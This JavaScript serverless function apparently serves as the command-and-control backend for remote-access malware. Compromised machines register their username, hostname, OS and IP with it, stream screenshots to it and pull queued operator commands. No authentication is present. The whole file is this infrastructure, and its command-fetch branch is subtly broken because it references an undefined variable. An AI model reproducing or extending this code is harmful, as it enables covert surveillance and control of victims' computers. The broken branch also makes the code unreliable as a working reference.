const { getStore } = require("@netlify/blobs");

exports.handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  // Handle preflight
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers };
  }

  const path = event.path;
  const store = getStore('remote_control');

  try {
    // === API: REGISTER ===
    if (path.endsWith('/api/register') && event.httpMethod === 'POST') {
      const data = JSON.parse(event.body);
      const targetId = data.target_id || 'unknown';
      const now = Date.now();

      const targetInfo = {
        id: targetId,
        username: data.username || 'Unknown',
        hostname: data.hostname || 'Unknown',
        os: data.os || 'Unknown',
        ip: data.ip || 'Unknown',
        first_seen: now,
        last_seen: now,
        online: true
      };

      await store.set(`target:${targetId}`, JSON.stringify(targetInfo));

      // Update active list
      let activeList = await store.get('active_targets');
      activeList = activeList ? JSON.parse(activeList) : [];
      if (!activeList.includes(targetId)) {
        activeList.push(targetId);
        await store.set('active_targets', JSON.stringify(activeList));
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true, target_id: targetId })
      };
    }

    // === API: GET TARGETS ===
    if (path.endsWith('/api/targets') && event.httpMethod === 'GET') {
      const activeList = await store.get('active_targets');
      const targetIds = activeList ? JSON.parse(activeList) : [];
      const now = Date.now();
      
      const targets = [];
      
      for (const targetId of targetIds) {
        const targetData = await store.get(`target:${targetId}`);
        if (targetData) {
          const target = JSON.parse(targetData);
          target.online = (now - target.last_seen) < 120000; // 2 minutes
          targets.push(target);
        }
      }

      // Sort by last seen (newest first)
      targets.sort((a, b) => b.last_seen - a.last_seen);

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify(targets)
      };
    }

    // === API: HEARTBEAT ===
    if (path.includes('/api/heartbeat/') && event.httpMethod === 'POST') {
      const targetId = path.split('/').pop();
      const targetData = await store.get(`target:${targetId}`);
      
      if (targetData) {
        const target = JSON.parse(targetData);
        target.last_seen = Date.now();
        target.online = true;
        await store.set(`target:${targetId}`, JSON.stringify(target));
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true })
      };
    }

    // === API: SCREEN ===
    if (path.includes('/api/screen/')) {
      const targetId = path.split('/').pop();
      
      // POST: Upload screen from client
      if (event.httpMethod === 'POST') {
        const data = JSON.parse(event.body);
        
        const screenData = {
          screen: data.screen,
          timestamp: Date.now(),
          quality: data.quality || 70
        };
        
        await store.set(`screen:${targetId}`, JSON.stringify(screenData));
        
        // Update target last seen
        const targetData = await store.get(`target:${targetId}`);
        if (targetData) {
          const target = JSON.parse(targetData);
          target.last_seen = Date.now();
          await store.set(`target:${targetId}`, JSON.stringify(target));
        }
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true })
        };
      }
      
      // GET: Get screen for web panel
      if (event.httpMethod === 'GET') {
        const screenData = await store.get(`screen:${targetId}`);
        
        if (!screenData) {
          return {
            statusCode: 404,
            headers,
            body: JSON.stringify({ error: 'No screen data' })
          };
        }
        
        const screen = JSON.parse(screenData);
        const now = Date.now();
        
        // Remove if older than 15 seconds
        if (now - screen.timestamp > 15000) {
          await store.set(`screen:${targetId}`, null);
          return {
            statusCode: 404,
            headers,
            body: JSON.stringify({ error: 'Screen data expired' })
          };
        }
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify(screen)
        };
      }
    }

    // === API: COMMANDS ===
    if (path.includes('/api/commands')) {
      // POST: Send command
      if (event.httpMethod === 'POST') {
        const data = JSON.parse(event.body);
        const { target_id, command } = data;
        
        const commandId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        const commandData = {
          id: commandId,
          target_id,
          ...command,
          timestamp: Date.now(),
          status: 'pending'
        };
        
        await store.set(`command:${target_id}:${commandId}`, JSON.stringify(commandData));
        
        // Add to queue
        const queueKey = `queue:${target_id}`;
        let queue = await store.get(queueKey);
        queue = queue ? JSON.parse(queue) : [];
        queue.push(commandId);
        await store.set(queueKey, JSON.stringify(queue));
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true, command_id: commandId })
        };
      }
      
      // GET: Get commands for target
      if (event.httpMethod === 'GET') {
        const targetId = path.split('/').pop();
        const queueKey = `queue:${target_id}`;
        const queueData = await store.get(queueKey);
        
        if (!queueData) {
          return {
            statusCode: 200,
            headers,
            body: JSON.stringify([])
          };
        }
        
        const commandIds = JSON.parse(queueData);
        const commands = [];
        
        for (const commandId of commandIds) {
          const commandData = await store.get(`command:${target_id}:${commandId}`);
          if (commandData) {
            commands.push(JSON.parse(commandData));
          }
        }
        
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify(commands)
        };
      }
    }

    // === API: COMMAND DONE ===
    if (path.endsWith('/api/command_done') && event.httpMethod === 'POST') {
      const data = JSON.parse(event.body);
      const { target_id, command_id } = data;
      
      // Remove from queue
      const queueKey = `queue:${target_id}`;
      let queue = await store.get(queueKey);
      if (queue) {
        queue = JSON.parse(queue);
        queue = queue.filter(id => id !== command_id);
        await store.set(queueKey, JSON.stringify(queue));
      }
      
      // Remove command
      await store.set(`command:${target_id}:${command_id}`, null);
      
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true })
      };
    }

    // Default response
    return {
      statusCode: 404,
      headers,
      body: JSON.stringify({ error: 'Not found' })
    };

  } catch (error) {
    console.error('API Error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: error.message })
    };
  }
};
